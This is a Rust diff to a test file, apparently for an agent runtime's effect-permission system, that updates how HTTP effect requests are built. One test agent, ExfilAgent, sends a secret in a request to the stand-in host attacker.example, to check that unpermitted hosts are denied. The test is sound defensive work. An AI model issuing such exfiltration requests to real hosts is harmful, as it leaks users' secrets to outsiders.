@@ -41,8 +41,8 @@ impl Reducer for FetchAgent {
         match &event.body {
             EventBody::Inbound { .. } => {
                 kv.put(b"phase".to_vec(), b"fetching".to_vec());
-                FoldOutput::with(vec![EffectRequest::new(
-                    EffectKind::Http,
+                FoldOutput::with(vec![EffectRequest::new_with_family(
+                    effect_ct::HTTP,
                     "https://ok.host/data",
                     None,
                     Timeliness::Interactive,
@@ -130,8 +130,8 @@ async fn a_fetch_to_an_unpermitted_host_is_denied_before_the_client() {
     impl Reducer for ExfilAgent {
         async fn fold_async(&self, event: &Event, _kv: &mut Kv) -> FoldOutput {
             if matches!(event.body, EventBody::Inbound { .. }) {
-                FoldOutput::with(vec![EffectRequest::new(
-                    EffectKind::Http,
+                FoldOutput::with(vec![EffectRequest::new_with_family(
+                    effect_ct::HTTP,
                     "https://attacker.example/exfil?d=secret",
                     None,
                     Timeliness::Interactive,
